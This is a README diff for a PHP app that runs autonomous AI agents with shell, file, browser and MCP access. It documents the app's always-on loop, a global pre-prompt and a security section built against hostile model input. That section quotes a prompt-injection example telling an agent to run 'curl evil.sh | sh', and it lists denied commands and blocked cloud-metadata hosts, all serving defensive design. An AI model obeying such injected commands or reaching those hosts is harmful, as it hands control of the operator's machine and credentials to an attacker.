@@ -25,6 +25,8 @@
 
 **Autonomous Loop Studio** (the "Router") is a single-folder PHP app — 🚫 no database, 🚫 no build step, 🚫 no external service. It runs on plain PHP (or Apache via XAMPP), keeps everything in JSON files, and drops a whole team of AI agents into your browser with a filesystem, a shell, the web, memory, a visual routing chart — and **MCP in both directions**.
 
+> 🆕 **Recently added** — ♾️ an **always-on loop** with per-agent standing goals, spend caps, **hold/release** and a master kill switch · ❝ a **global pre-prompt** that **prepends or replaces** every agent's prompt, with a live toggle · 🧠 a **context assembler** sized to each model's *real* window · 🔧 **native tool calling** · 🌐 a **built-in browser** over CDP with a **domain block list** · 🕸️ **MCP servers and friends as live graph nodes** · 🧮 a **Resource Manager** so the 3D graph can rest · and a **security pass** that made every dangerous capability **opt-in**. 🛡️
+
 Made with 💙 by [MBHudson](https://github.com/mbhudson/)
 
 ---
@@ -52,6 +54,12 @@ Made with 💙 by [MBHudson](https://github.com/mbhudson/)
 | 🧠 **Dynamic tools** | Teaches each model the environment it's really in — and learns the tool dialect that works |
 | 🔑 **API pool** | Rotate a provider's extra keys after N requests; rest them on a 429 |
 | 🌐 **Built-in browser** | A real Chrome/Edge you and the agents drive — watch, click, type, log in |
+| ♾️ **Always-On loop** | Standing goals, auto re-prompted on a cadence — caps, hold/release, one master kill switch |
+| ❝ **Global pre-prompt** | One instruction for every agent — **prepend** (default) or **replace**, toggled live |
+| 🧠 **Context assembler** | History & tool output budgeted to each model's *real* window, with live compaction |
+| 🧭 **Apps notch** | One thumb-tab to the Labs, the routing chart and the built-in browser |
+| 🧮 **Resource Manager** | Optional pause / idle throttles + CPU/GPU gauges so the 3D graph can rest |
+| 🕸️ **MCP on the graph** | Outgoing calls and incoming friends drawn as live nodes with editable access |
 | 📱 **Mobile-first** | Built for the phone in your pocket |
 
 ---
@@ -100,14 +108,21 @@ On Windows the app opens at `http://localhost:8080/router/` (Apache); on Linux/m
 One rail for everything about the selected agent:
 
 - **Identity** — name, label, role, provider, model, colour, active.
-- **Prompts & Profiles** — the agent's system prompt, an always-append box, and reusable **direction profiles** you can attach and lock.
-- **Rate / Throttle** — per-agent pacing (or follow the global limiter).
+- **Prompts & Profiles** — the agent's system prompt, an always-append box, and reusable **direction profiles** you can attach and lock. (A fleet-wide override lives in the Agents-tab header — see *Global pre-prompt override*.)
+- **Direction profiles** — reusable, lockable instructions you can **attach** and **append** to any agent, so a house style is defined once and shared.
+- **Rate / Throttle** — per-agent pacing.
 - **Approvals & Tools** — per-tool **allow / ask / deny**, plus a tool protocol picker that shows the **auto-detected** dialect.
-- **Memory** — private and collective notes, with a Long-term-memory switch and delete buttons (forgetting is a first-class action).
+- **Custom tools** — define your own, straight from the rail.
 - **Sandbox** — a per-agent **file jail** and the file manager.
-- **Always-On** — a standing goal, loop cadence, and a live RUNNING/HELD/IDLE badge.
+- **Memory** — private and collective notes, a Long-term-memory switch, and delete buttons (forgetting is a first-class action).
+- **Always-On** — a standing goal, loop cadence, and a live RUNNING/HELD/IDLE badge. (Full walk-through in *Always-On — the loop that runs itself* below.)
 
-Every setting has a 🔒 **lock**: unlocked agents follow the global value live; a lock pins the agent to its own value so a global change never moves it.
+Every setting has a 🔒 **lock**: unlocked agents follow the global value live; a lock pins the agent to its own value so a global change never moves it. 🔏
+
+> 🗂️ **Config, tidied.** The Config tab is split into collapsible sections
+> (**Interface / Limits & Budgets / Permissions / Throttle & Limiter**) with a
+> live status badge on each header — and it **rescues numbers you typed but
+> haven't Saved yet**, so switching tabs mid-edit never silently discards them.
 
 ---
 
@@ -173,6 +188,79 @@ Type `/` in the composer for a palette of everything you can address. ⌨️✨
 - 🎯 **Target an agent** — `/CODE`, `/ROLE`, `/NAME` or `/ALL` sends your next message to one agent, a role, or the whole team.
 - 🧭 **App commands** — the palette also lists the app's own commands, and never suggests one that wouldn't work here.
 - ❓ **`/?`** — a quick reference, right in the input box.
+
+---
+
+## ♾️ Always-On — the loop that runs itself
+
+Give an agent a **standing goal** and this app re-invokes it on a timer, one turn
+at a time, until it finishes or you stop it. It is the difference between *"ask
+the model a thing"* and *"hand the model a job and walk away."* 🚶♂️💨
+
+- 🎯 **A standing goal per agent** — set it in the agent editor (or Brain Lab). Every tick, the agent is re-prompted with its goal, the iteration number, and a plain instruction to **make concrete progress now using its tools.**
+- ⏱️ **A cadence you own** — the interval lives in **Config → Limits & Budgets** (default generous, because every iteration is **billed**). 💸
+- 🧭 **An honest badge** — each agent card shows **RUNNING** while it works, **HELD** when it's parked, and idle otherwise, so a glance tells you the truth.
+- 🛑 **Stop one, release one** — click an agent's **ALWAYS ON** badge to stop that run without switching the agent off. It becomes **HELD**; click again to release it and resume next tick.
+- 🧰 **Release *everyone* in one click** — **Config → Permissions → Always-On** shows how many agents are held and a **RELEASE HELD AGENTS** button, so a roster parked by a cap (or by hand) is never a trap you have to click through one agent at a time.
+- 🧨 **Two spend caps, both off by default** — **Max iterations** and **Max minutes**. When a cap trips the agent is **parked and held** (that's the point of a spend guard) and the status line tells you when a cadence is long enough that the cap would fire after a *single* tick — so you can set it to `0` and loop forever if that's what you want.
+- 🔌 **Survives leaving the tab** — flip **Config → Permissions → Run while tab is hidden** and the timer is driven by a **Web Worker** (page timers are throttled hard in a background tab), with the in-flight turn no longer aborted the moment you switch away. Come back and it ticks immediately.
+- 🧯 **Master kill switch** — **Config → Permissions → *Enable always-on*** stops everything at once, aborts in-flight autonomous turns, and **releases everyone** so switching it back on is a clean, working reset.
+- ✅ **Only the right agents run** — an agent needs a standing goal **and** its own always-on switch **and** to be active **and** not held before the scheduler will touch it.
+- 🧵 **Runs in the page, by design.** There is no server-side runner — this stops when the tab closes, which is exactly why it's cheap and easy to reason about.
+
+> 📝 **Tip:** a standing goal of `idle` (or two words) gives the agent nothing to
+> aim at, so it will wander and "explore." Give it a real objective — *"run the
+> test suite and fix failures until green."* The status line in Config tells you
+> roughly how many turns/hour that will cost.
+
+---
+
+## ❝ Global pre-prompt override — one instruction for the whole fleet
+
+A single box in the **Agents-tab header** (§ button) that reaches **every agent's
+system prompt**, on every call path — main chat, ask-directly and routing-chart
+runs alike. ✨
+
+- 🧩 **Prepend (default) or Replace — your call.** A toggle **inside the popup**
+  (bottom-left) picks the behaviour, and the hint above the box updates to match:
+  - **Prepend (off, default)** — the override is placed **in front of** each agent's own prompt, which still follows. Best for a house rule that everything should obey. 🏠
+  - **Replace (on)** — the override **stands in for** the agent's prompt. Best for a temporary "everyone answer like *this*." 🎭
+- 🪄 **Toggle it live** — **Edit** to write it, **Activate / Deactivate** to arm it without opening the editor. The button **pulses** while it's armed. 💠
+- 🔒 **Stored prompts are never harmed** — the moment you switch it off (or flip back to Prepend), every agent's own prompt returns exactly as it was.
+- ⚠️ **It can fight tools — and the app knows it.** A pre-prompt like *"reply with ONLY text / 9 words"* used to make agents narrate tool calls instead of sending them. The tool instructions now state plainly that a **tool call is the one exception** to any brevity rule, and the loop **re-prompts once** if a model only *says* it will use a tool.
+
+---
+
+## 🧭 The apps notch — one thumb to everything
+
+A pull-tab centred just under the header **dips into the chat area** — a `\___/`
+notch sized for a thumb. Tapping it drops the **apps menu**: 🧠 **Brain Lab**,
+🧪 **API Lab**, 🔀 the **Routing chart** and 🌐 the **built-in browser** — so a
+phone never has to hunt through the header, and the top rail keeps only what you
+reach for constantly. It closes on an outside tap, on **Esc**, or when you pick
+something. 📱
+
+---
+
+## 🧠 The context assembler & native tool calling
+
+So a long job doesn't quietly fall out of the model's memory mid-task. 🧵
+
+- 📏 **Budgeted against the model's *real* window** — replayed history is sized to
+  the model's actual context limit (not a fixed `24k` characters), and each
+  oversized tool result keeps its **head and tail** instead of being cut mid-answer.
+- 🗜️ **Live-context compaction** — old assistant / `TOOL_RESULT` exchanges are
+  compacted before **every** request, so the tool transcript can't crowd the
+  conversation out.
+- 📋 **The plan survives** — the `todo_write` list is re-injected into the system
+  prompt and refreshed after each write, so it doesn't get compacted away halfway
+  through.
+- 🔧 **Native tool calling** — where the API family supports it, tools are sent as
+  **real schemas** (OpenAI, Anthropic and Google shapes) instead of a syntax the
+  model has to imitate, with automatic fallback to the prompt protocol if a
+  provider rejects them.
+- 🧠 **Learned dialect** — see *Dynamic tools* below: the dialect that last worked
+  for a `provider::model` is remembered and tried first.
 
 ---
 
@@ -274,6 +362,24 @@ The whole loop as a living map. Every activated agent and provider becomes a glo
 - 🧵 **Traffic lines** — dotted and colour-matched to the model, with dots marching the direction the message actually travelled: ➡️ toward **You** for a reply, ⬅️ from **You** for a request.
 - 🕹️ **Controls** — drag to orbit, scroll to zoom, right-drag to pan, click a node for its 📊 metrics, and switch 🧊 3D / 🗺️ 2D or go fullscreen.
 - 🔔 **Notifications** — a bell keeps a running list of run errors and warnings so nothing scrolls past unnoticed.
+- 🟠 **MCP nodes** — a server you *call* (**amber**) and a friend's client connected *to you* (**sky**) each become a node with the same clickable card: transport, reachability and tool count, tool policy, scope, and recent calls. Outgoing calls animate live (agent → server → agent); incoming friend traffic ticks in from the server's audit log.
+- 🗂️ **Two extra tabs on every MCP card** — **Access** edits the node itself (a server's connection plus a per-server **tool allow/deny**; a friend's **read/write/exec** scope and **IP allowlist**); **Permissions** edits the app-wide shell allow/deny lists, interpreter levels, auto-approve / auto-deny and the code interpreter — inline.
+- ❓ **Ask a model from its node** — the 3D card carries an **ASK** button that docks a small prompt box with a send button and a **Voice** toggle. The answer lands in a floating box pinned to the graph, isolated from the transcript, while the traffic still animates.
+- 🛠️ **Verbose inline replies** — the graph's reply box prints the **real tool work** verbatim (call name, pretty-printed arguments, status, duration, full output) before the closing answer, and only the closing answer is ever read aloud. 🔊
+
+---
+
+## 🧮 Resource Manager — let the 3D graph rest 😴
+
+The living map is lovely and also, by default, *always on*. **Config → Resource
+Manager** adds optional brakes — every switch **off by default**, so nothing
+changes until you ask:
+
+- 🪟 **Pause when a panel is open** (routing chart, API Lab, Brain Lab, browser, modals) — no point rendering a graph behind a full-screen drawer.
+- 🎯 **Pause when the window isn't focused** — switch to another app and it stands down.
+- 👀 **Pause when the graph is off-screen** — an `IntersectionObserver`, which also fixes the **mobile** case where the panel is slid off-screen and kept rendering unnoticed.
+- 🐢 **Slow down when idle** (default **10 fps**) — idle means no traffic beams, no working agents, settled layout, no recent interaction.
+- 🧭 **Two speedometer gauges** + an FPS / frame-ms readout — **CPU** is this app's JS share of each frame; **GPU** is real GPU ms via `EXT_disjoint_timer_query_webgl2` when the browser exposes it, otherwise a clearly-labelled estimate.
 
 ---
 
@@ -306,12 +412,104 @@ Take your work with you. 📦
 
 ---
 
-## 🔐 Security model
+## 🔐 Security & guardrails — safe by construction 🛡️
 
-- **Access token** — every API endpoint is gated. Generate with `./setup-token.sh`, paste into **Config → Access token** per device.
-- **Approvals** — `write_file`, `exec`, `run_code`, `git_commit` and friends ask first (Allow once / Always / Deny). Auto-approve is opt-in.
-- **Allow / Deny lists** — an argv-level command allowlist, an **absolute** denylist, and per-interpreter levels (Blocked / Scripts only / Full).
-- **Jail + protected paths** — file tools resolve server-side and refuse anything outside the roots, and a **protected list** refuses secrets even inside a root.
+> **The short version:** giving a language model a shell, a filesystem and the web
+> is normally a terrifying idea. So this app assumes the model is *hostile*, the
+> web content it reads is *booby-trapped*, and the only trustworthy actor is
+> **you, the operator**. Every capability is **off until you switch it on**, every
+> dangerous action **asks first**, and every escape hatch has a floor beneath it.
+> Nothing ships with a key 🔑, nothing runs before a token 🔑, and no tool can
+> reach past the fence you drew. 🧱
+
+### 🔑 1. The front door is locked — a per-device access token
+- **🚪 Every single API route is gated.** No token → `401`. The only thing standing between a stranger and your agents' conversations, your files and your shell; the app has **no user accounts**, on purpose.
+- **🧬 Nothing ships with a token.** A fresh copy **refuses to serve anything** until you run `./setup-token.sh` (or the one-click installer does it for you) — a fresh install answers `503 {"error":"no token configured"}`. You literally cannot forget to set one.
+- **📵 The token never roams.** It is a **device-local credential**, *stripped from every state bundle* before it is mirrored to the server or synced to another device. One browser's empty field can never wipe another device's working paste.
+- **🔁 Rotate on demand** — `./setup-token.sh --force` mints a new one; the old value dies instantly.
+
+### 🚦 2. Approvals — nothing scary happens without a nod
+- **✋ Ask-first by default.** `write_file`, `exec`, `run_code`, `git_commit` and their friends **queue a prompt** you answer: **Allow once / Always / Deny**.
+- **🟢 Auto-approve is opt-in** — an explicit switch you flip, never an inherited default. Turn it on and any agent may write files without asking; leave it off and a human stays in the loop.
+- **🛑 Auto-deny — the panic button.** One switch refuses *everything* that would otherwise ask, instantly, everywhere.
+- **📥 A single Pending-approvals queue** collects everything waiting (from every agent **and** every remote MCP friend) so nothing slips through unseen.
+
+### 🧾 3. Allow / Deny lists — an argv-level bouncer
+- **✅ An allowlist you own** decides which programs may run at all. Each command is matched **argument by argument** — no glob fuzz.
+- **⛔ An *absolute* denylist** that **cannot be approved away** from the UI. If it's denied, it's denied. `reboot`, `shutdown`, `rm`, `sudo` and the classic foot-guns live here for good.
+- **🧨 Tripwires for metacharacters** — `|`, `&&`, `eval`, `xargs`, `env` and friends are refused, so a model can't smuggle a second command through a "harmless" one.
+- **🎚️ Per-interpreter levels** — Blocked / Scripts only / Full — so `run_code` can be dialled from "no" to "quiet scripts" to "go wild" independently of `exec`.
+
+### 🧱 4. The jail — a fence with no back gate
+- **🔒 Every path is resolved server-side.** `../`, `..\\`, absolute paths and **symlinks** are all resolved and then checked — anything outside your declared **read/write roots** is refused with a message the model can read, not a mysterious crash.
+- **🙈 Protected paths — secrets are invisible even *inside* a root.** A default deny-list (`storage/`, `.git`, `.env*`, `*.pem`, `*.key`, dotfiles, …) is enforced in the resolver itself, so **even if you point the root at the whole app folder, the access token and every provider key still cannot be read.** Clear the list to opt out — nothing is permanent.
+- **✂️ Write scope is separate from read scope.** Keep writes in a scratch folder and even a prompt-injected agent can't overwrite `Config.php`, `.htaccess` or session data.
+
+### 🐚 5. No shell to hijack
+- **🧩 `exec` takes an *argv array*, not a string.** There is **no `sh -c`, no pipes, no redirects, no `$(...)`** — so there is no second command to inject, ever. The dangerous parts of "running a command" simply don't exist here.
+- **🪟/🐧 Windows-aware** — builtins are implemented in PHP where no `.exe` exists, `.cmd`/`.bat` shims are never shelled, and the prompt is told the truth about the host so it stops guessing.
+
+### 🧬 6. Edits are atomic, or they don't happen
+- **🧷 `apply_patch` (V4A) and `multi_edit` are all-or-nothing.** Every hunk must match its context **exactly once**; one miss and **nothing is written** — no half-applied file, no corrupted source.
+- **👀 Read-before-write** is the taught workflow, and search/replace refuses an ambiguous match rather than guessing which one you meant.
+
+### 🐙 7. Git runs on a leash
+- **📜 A subcommand allowlist** — read-only commands (`status`, `diff`, `log`, `show`, `blame`) run freely; anything that **writes** (`add`, `commit`, `checkout`, …) **asks first**.
+- **🚫 Retargeting flags refused** — `-c`, `--git-dir`, `--work-tree`, `--output` can't be used to point git at somewhere it shouldn't go. `git_commit` supplies a safe default identity so it works on a clean host.
+
+### 🌐 8. Network egress is fenced (SSRF guardrails)
+- **🛰️ `fetch_url` and `http_request` refuse private and cloud-metadata hosts** by name — `169.254.x.x`, `metadata.google.internal`, `100.100.100.200` and friends — so a model can't use your box to probe the internal network or steal cloud credentials.
+- **🔒 `http/https` only.** Spoofed `Host`, `Content-Length` and `Accept-Encoding` headers are **stripped**; responses are **truncated** so a giant page can't exhaust memory.
+- **🧪 The API Lab keeps the same rules** and names the layer it failed at (dns / tls / connect / timeout / blocked) instead of leaking a stack trace.
+
+### 🕵️ 9. Secrets never appear on screen
+- **🙈 Key-shaped headers (`Authorization`, `x-api-key`, `Cookie`, …) are masked in the UI** — display only. Copy and send still use the real value, and the server **never echoes request headers back**.
+- **📚 The converter lesson, learned the hard way.** Saved browser pages faithfully preserve secrets. The app now keeps such dumps **out of the webroot**, and the guidance is plain: **strip keys before saving a page.**
+
+### 🖼️ 10. Vision is safe by construction
+- **🧨 An image that is *also* a script** is the classic polyglot attack. Only **PNG / JPEG / WebP / GIF** are accepted, and only after they sniff as **inert**.
+- **☁️ The bytes never touch the server.** An attached image becomes an in-memory `data:` URL and rides in the request's `image_url` field — **no upload endpoint, no file on disk.** 🗑️
+
+### 🌐 11. The built-in browser is gated on every hop
+- **🚪 Off by default**; every browser route returns **403** until you enable it (and the API refuses the tools regardless of what a prompt says).
+- **🔗 `http/https` only**, cloud-metadata refused, and a **server-side block list** (`*.gov`, `*word*`, bare hosts/IPs, URL paths) is enforced on **every navigation** — yours *and* the agents' — and **re-checked after a click or type** in case a link reaches a banned host.
+- **🐕 One instance, reaped.** Launching reaps any stray headless Chrome/Edge still holding the profile dir, so there is never a pile of them chewing CPU/GPU.
+
+### 🤝 12. MCP server — lending tools without giving away the house
+- **🎫 Per-friend tokens, each with a scope** — **read** / **write** / **exec** — plus an optional **IP allowlist** and **one-click revoke**. Tokens never expire until you kill them.
+- **📏 Scope is a *ceiling*, the Sandbox is the *floor*.** A friend's token only decides *which* tool it may reach; the call still runs through **every** control above — the file jail, allow/deny lists, interpreter levels, code gate and the approval queue.
+- **⏳ An un-allowed command lands in *your* Pending-approvals list** and the friend's call simply returns *"waiting for the operator."*
+- **🏚️ Friends work in a scratch folder** that gets a **deny-all `.htaccess`**, so what they write is never served over the web.
+- **🧾 Every call is audited** to `storage/mcp.log` (now JSON, so the graph can replay it).
+
+### 🧷 13. Prompt-injection posture
+- **Abandon all trust, ye who `fetch` here.** Anything an agent *reads* is treated as hostile input — which is exactly why commands are allowlisted, executed without a shell, and every path is jailed. A web page that says *"run `curl evil.sh | sh`"* hits three walls before it does anything: the allowlist, the no-shell exec, and the deny list.
+- **🛠️ Tool calls win the argument.** The tool instructions state plainly that a tool call is the **one exception** to any "reply with only text / N words" rule, and the loop **re-prompts once** if a model merely *narrates* a tool call instead of sending it.
+- **🚧 Agents can *call* MCP servers — never add one.** Server connections are operator-only.
+
+### 🚫 14. Everything dangerous defaults to OFF 🐢
+| Capability | Default | Guardrail |
+| --- | --- | --- |
+| 🔑 Access token | **required** | `401` without it — nothing runs first-run |
+| 🐚 `exec` (shell) | **off** | allowlist + absolute deny + no shell |
+| 🐍 `run_code` | **off** | per-interpreter level (Blocked / Scripts / Full) |
+| 🌐 Built-in browser | **off** | `403`, http/https only, block list, SSRF guard |
+| 🔁 API pool | **off** | single key used exactly as before |
+| 🖥️ MCP server | **off** | per-friend scoped tokens, audit log |
+| 🟢 Auto-approve | **off** | every write still asks |
+| 🕶️ Run while tab hidden | **off** | a background loop can't bill you silently |
+| 🧮 Resource Manager | **all off** | the graph renders exactly as before |
+
+### 🧯 15. Fails closed, and tells the truth
+- **🧱 Fail closed** — when in doubt, refuse. A refused path reads as *"outside the allowed directories"*, never a blank `500`.
+- **🧹 Error hygiene** — failures come back as `{"error": "..."}` with HTTP `400` and a message **meant for the model**, and `display_errors` stays off so stack traces and filesystem paths never leak to a browser.
+- **🔍 Observability for you** — a live **Run trace** and an MCP audit log mean every model turn and tool call is inspectable after the fact.
+
+> ⚖️ **The honest caveat:** the app is only as safe as the operator's switches. Turn
+> everything on, auto-approve writes, and point the root at `/` — and you have built
+> yourself a very capable foot-gun. The design *makes the safe choice the default*
+> and *makes the unsafe choice deliberate*, but it does not (and cannot) read your
+> mind. Keep the root narrow, keep approvals on, and rotate your keys. 💙
 
 ---
 
@@ -379,6 +577,9 @@ A **real Chrome or Edge**, right inside the console — 🚫 no packages, 🚫 n
 - 🤖 **Agents use the same page** — `browser_open` / `browser_click` / `browser_type` / `browser_read` / `browser_wait` drive it too, so a model can genuinely operate a web app.
 - 🔐 **Logins stick** — the profile is persistent: log in **once** (headless, or in a window you can take over 🫳) and both you and the agents reuse the session.
 - 🛡️ **Off by default and gated** — Config → Labs → *Browser* switches it on; **http/https only**, cloud-metadata addresses refused, and every route is token-gated.
+- 🚫 **A domain / URL / IP block list** — a right-rail box on the Browser screen. One pattern per line, `*` wildcard: `*.gov`, `*word*`, a bare host/IP (`10.0.0.1`), or a URL path (`site.com/a/b/`). Enforced **server-side on every navigation** — yours *and* the agents' — and **re-checked after a click or type** in case a link reaches a banned host.
+- 🐕 **One browser, reaped** — launching (or stopping) reaps any stray headless Chrome/Edge still holding the profile dir, so orphan instances never pile up and chew CPU/GPU.
+- ⚡ **No multi-second stalls** — DevTools HTTP is read by exact `Content-Length` over a raw socket, navigation returns the moment the page is interactive, and every action is single-flight so a slow page can't stampede the connection pool.
 
 ---
 
@@ -409,13 +610,18 @@ The UI is **mobile-first** — touch controls, a responsive layout, an icon rail
 │   ├── ModelManager.php  # relays + streaming
 │   ├── Harness.php       # provider / tool-dialect registry
 │   ├── Sandbox.php       # jail, files, exec, git, code, http
+│   ├── Cdp.php           # hand-rolled WebSocket + DevTools Protocol client
+│   ├── Browser.php       # detect / launch / drive Chrome or Edge
 │   ├── Mcp.php           # MCP client
 │   ├── McpServer.php     # MCP server
 │   ├── SessionManager.php
 │   ├── TopologyGraph.php
 │   └── Audio.php
 ├── ui/
-│   ├── js/               # app modules (store, api, tools, harness, brainlab…)
+│   ├── js/               # app modules: store · api · stateSync · tools ·
+│   │                     #   toolManifest · toolProtocol · harness · nativeTools ·
+│   │                     #   apiPool · trace · perf · brainlab · alwaysOn · memory…
+│   │   └── components/   # chat · sidebar · routingChart · browserView · topology3d/…
 │   └── css/
 ├── tools/
 │   ├── gen-harness.php   # generates ui/js/harness.data.js
@@ -461,7 +667,9 @@ Failures come back as `{"error": "..."}` with HTTP 400 and a message meant for t
 - **"PHP's curl extension is not enabled"** → the server was started without the launcher (e.g. a bare `php -S`). Use `start.bat` / `start.sh`, or run `php serve.php --setup`.
 - **Every request returns 401** → the **Access token** isn't pasted on this device. The token is per-device; paste it in **Config → Access token**.
 - **Phone shows an empty UI or immortal 401s** → a **split-brain** load. Deploy the **whole `ui/` folder** (never single files) and hard-refresh — mixing module versions gives each its own store.
-- **Agents "won't use tools"** → check for a **global pre-prompt** that says "reply with ONLY text / N words" — it fights the tool protocol. The tool instructions now override it and the loop re-prompts once, but turning it off is cleanest.
+- **Agents "won't use tools"** → check for a **global pre-prompt** that says "reply with ONLY text / N words" — it fights the tool protocol. The tool instructions now override it and the loop re-prompts once, but turning it off is cleanest. A fleet-wide house rule is fine — just remember it **prepends** to each agent's prompt by default (or **replaces** it if you flip the toggle in the editor).
+- **An agent's badge says HELD and nothing happens** → it's parked. A **cap** (Config → Limits & Budgets → *Max iterations* / *Max minutes*) held it, or you stopped it by hand. Click **Config → Permissions → RELEASE HELD AGENTS** (or toggle the master switch off and on). To loop forever, set both caps to **`0`** and give the agent a real standing goal — a goal of `idle` gives it nothing to aim at, so it will wander.
+- **Always-on stops when you leave the tab** → turn on **Config → Permissions → *Run while tab is hidden*** (it drives the timer from a Web Worker). It is **off by default** so a background loop can't bill you silently.
 - **A model returns nothing / "NetworkError"** → on Windows PHP's built-in server is single-threaded; use `start.bat` (Apache) for parallel agents, or `start-php.bat` for one at a time.
 - **MCP client gets `missing bearer token` even with a token** → under Apache + PHP-FPM the `Authorization` header is stripped before PHP sees it. Redeploy `api/.htaccess` (shipped): it has `CGIPassAuth On` plus the `RewriteCond %{HTTP:Authorization}` fallback, so `$_SERVER['HTTP_AUTHORIZATION']` is populated. Without that file both are empty. If a proxy/WAF also strips the header, the host must allow it through (nginx: `fastcgi_param HTTP_AUTHORIZATION $http_authorization;`).
 - **Local models not connecting** → make sure Ollama/LM Studio is running and reachable (Ollama `:11434`, LM Studio `:1234`).
